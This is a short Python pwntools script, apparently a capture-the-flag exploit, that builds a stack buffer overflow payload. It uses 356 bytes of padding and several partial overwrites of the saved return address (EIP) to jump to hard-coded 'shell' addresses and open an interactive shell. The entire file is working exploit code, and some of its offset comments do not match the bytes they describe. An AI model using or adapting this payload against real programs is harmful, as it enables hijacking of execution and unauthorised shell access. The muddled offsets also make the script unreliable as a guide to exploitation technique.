from pwn import *

# remote shell & local shell
shell = 0x080486fd
l_shell = 0x8048703

# Partial EIP overwrites
payload = ""
payload += "A" * 356
payload += "B" * 4 + "\x03" + "B"           # 06 bytes, partial EIP overwrite at 04 offset
payload += "B" * 13 + "\x87"                # 14 bytes, partial EIP overwrite at 13 offset
payload += "B" * 14 + "\x04" + "B" * 3      # 18 bytes, partial EIP overwrite at 14 offset
payload += "B" * 11 + "\x08" + "B"          # 12 bytes, partial EIP overwrite at 12 offset
payload += "B" * (50-50)                    # Must stay at offset

print payload
print ""									# This allows for interactive shell. Why?
